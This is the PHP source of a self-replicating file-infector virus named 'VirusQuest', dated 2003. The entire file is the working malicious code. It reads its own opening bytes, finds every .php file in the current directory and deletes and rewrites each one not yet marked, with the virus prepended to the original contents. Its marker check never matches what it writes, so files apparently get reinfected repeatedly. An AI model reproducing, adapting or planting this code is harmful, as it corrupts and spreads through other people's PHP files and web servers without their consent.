<?php
function virusquest()
{
// Virus: VirusQuest
// Written by Dr Virus Quest
// Created on 08/09/2003
$c = "";
$f = fopen (__FILE__, "r");
$c = fread ($f, filesize (__FILE__));
fclose ($f);
$c = substr($c,0,2048);
$handle=opendir('.');
while (($file = readdir($handle))!==false) {
if ($file != "." && $file != "..") 
 {
$s = substr($file, -3);
if ($s=="php") 
   {
	$g = fopen ($file, "r"); 
	$cont = fread ($g,filesize ($file));      
	fclose ($g);
	if (!strstr($cont,"[VirusQuest]"))
	{
	unlink("$file");
	$g = fopen ($file, "a+"); 
	fwrite ($g,"$c");      	
	fwrite ($g,"\n");
	fwrite ($g,"Virus: VirusQuest\n");
	fwrite ($g,"Written by Dr Virus Quest\n");
	fwrite ($g,"Created on 08/09/2003\n");
	fwrite ($g,"\n");
	fwrite ($g,substr($cont,5));
	fclose ($g);
	}
   }

 }

}

closedir($handle); 
}
virusquest();
?>
